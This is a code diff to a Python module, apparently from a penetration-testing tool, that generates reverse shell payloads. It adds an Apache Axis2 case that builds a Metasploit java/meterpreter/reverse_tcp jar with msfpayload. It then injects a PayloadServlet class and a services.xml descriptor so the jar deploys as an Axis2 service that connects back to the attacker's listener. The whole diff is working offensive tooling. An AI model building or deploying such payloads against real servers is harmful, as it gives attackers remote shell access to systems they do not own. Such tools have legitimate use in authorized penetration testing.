@@ -1,7 +1,8 @@
 from commands import getoutput
 from log import LOG
 import utility
-
+import os
+from zipfile import ZipFile
 
 def run(options):
     """ This module is used for generating reverse shell payloads.  It's not
@@ -19,6 +20,9 @@ def run(options):
         return
     elif options.remote_service in ["coldfusion"]:
         out = "R > shell.jsp"
+    elif options.remote_service in ["axis2"]:
+        PAYLOAD = "java/meterpreter/reverse_tcp"
+        out = "R > shell.jar"
     else:
         out = "W > shell.war"
 
@@ -31,6 +35,29 @@ def run(options):
 
     resp = getoutput("msfpayload %s LHOST=%s LPORT=%s %s" %
                     (PAYLOAD, lhost, lport, out))
+
+    '''For axis2 payloads, we have to add a few things to the msfpayload output'''
+    if(options.remote_service in ["axis2"]):
+        services_xml="""<service name="shell" scope="application">
+                            <description>
+                                Clusterd axis2 service
+                            </description>
+                            <messageReceivers>
+                                <messageReceiver
+                                    mep="http://www.w3.org/2004/08/wsdl/in-only"
+                                    class="org.apache.axis2.rpc.receivers.RPCInOnlyMessageReceiver"/>
+                                <messageReceiver
+                                    mep="http://www.w3.org/2004/08/wsdl/in-out"
+                                    class="org.apache.axis2.rpc.receivers.RPCMessageReceiver"/>
+                            </messageReceivers>
+                            <parameter name="ServiceClass">
+                                metasploit.PayloadServlet
+                            </parameter>
+                        </service>"""
+
+        with ZipFile('shell.jar', 'a') as shellZip:
+            shellZip.write("./src/lib/axis2/PayloadServlet.class","metasploit/PayloadServlet.class")
+            shellZip.writestr("META-INF/services.xml",services_xml)
 
     if len(resp) <= 1 or 'Created by' in resp:
         utility.Msg("Payload generated (%s).  Payload: %s" % (out.split(' ')[2], PAYLOAD))
